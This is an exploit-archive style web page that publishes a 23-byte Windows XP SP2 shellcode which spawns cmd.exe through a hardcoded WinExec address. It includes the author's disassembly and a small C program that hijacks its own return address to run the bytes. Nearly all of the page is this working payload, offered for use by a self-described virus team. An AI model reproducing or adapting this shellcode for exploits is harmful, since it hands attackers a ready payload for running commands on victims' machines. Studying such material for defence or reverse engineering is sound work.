<html><head><title>Windows - sp2 (En + Ar) cmd.exe - 23 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
win32/xp sp2 (En + Ar) cmd.exe 23 bytes
Author : AnTi SeCuRe
TeaM : SauDi ViRuS TeaM
Email : AnTi-SeCuRe@HoTMaiL.CoM
Site : WwW.VxX9.Cc
Thx To : Stack , SauDi ViRuS TeaM ( RENO - Dr.php - ! BaD BoY ! - Jetli007 - Gov.hacker )
Description : It's a 23 Byte Shellcode which Execute Cmd.exe Tested Under Windows Xp SP2 English and arabic .
get the following if we disassemle this code compiled with olly debugger
 
00402000  &gt; 8BEC             MOV EBP,ESP
00402002  . 68 65786520      PUSH 20657865
00402007  . 68 636D642E      PUSH 2E646D63
0040200C  . 8D45 F8          LEA EAX,DWORD PTR SS:[EBP-8]
0040200F  . 50               PUSH EAX
00402010  . B8 8D15867C      MOV EAX,kernel32.WinExec
00402015  . FFD0             CALL EAX
*/
#include &lt;stdio.h&gt;
unsigned char shellcode[] =
                        &quot;\x8b\xec\x68\x65\x78\x65&quot;
                        &quot;\x20\x68\x63\x6d\x64\x2e&quot;
                        &quot;\x8d\x45\xf8\x50\xb8\x8D&quot;
                        &quot;\x15\x86\x7C\xff\xd0&quot;;
int main ()
{
int *ret;
ret=(int *)&amp;ret+2;
printf(&quot;Shellcode Length is : %d\n&quot;,strlen(shellcode));
(*ret)=(int)shellcode;
return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
